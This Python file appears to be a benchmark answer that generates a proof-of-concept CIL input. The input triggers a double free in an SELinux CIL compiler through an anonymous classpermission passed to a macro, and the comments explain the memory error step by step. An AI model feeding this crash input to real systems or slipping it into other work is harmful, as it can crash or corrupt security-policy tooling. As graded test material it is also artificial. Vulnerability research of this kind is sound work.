import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """

        # The vulnerability description outlines a double free scenario involving
        # an anonymous classpermission passed to a macro, which then uses it in
        # a classpermissionset rule.
        #
        # The PoC constructs this exact scenario using CIL (Common Intermediate Language):
        #
        # 1. `(class c (p))`: Defines a simple class `c` with a single permission `p`.
        #    This is the basic setup needed for class-based rules.
        #
        # 2. `(macro m ((classpermission cp)) ...)`: Defines a macro `m` that accepts
        #    one argument of type `classpermission`, named `cp`.
        #
        # 3. `(classpermissionset cps (c (cp)))`: Inside the macro `m`, a
        #    `classpermissionset` named `cps` is defined. It's associated with class `c`
        #    and contains the `classpermission` passed as the macro argument `cp`.
        #
        # 4. `(m (classpermission c (p)))`: The macro `m` is called. The argument
        #    provided is `(classpermission c (p))`, which is an *anonymous*
        #    classpermission (it has no identifier).
        #
        # The vulnerability is triggered as follows:
        # - An AST node for the anonymous `classpermission` is created for the macro call.
        # - The `classpermissionset` `cps` created during macro expansion stores a
        #   reference to this anonymous `classpermission` object.
        # - After the macro call expression is fully processed, the temporary anonymous
        #   `classpermission` object is destroyed (first free).
        # - Later, during the global AST cleanup phase, the `classpermissionset` `cps`
        #   is destroyed. As part of its cleanup, it attempts to destroy the
        #   `classpermission` object it holds a reference to, which has already been
        #   freed, leading to a double free.
        #
        # The PoC is compacted into a single line to minimize its size for a better score.
        poc = b"(class c(p))(macro m((classpermission cp))(classpermissionset cps(c(cp))))(m(classpermission c(p)))"
        
        return poc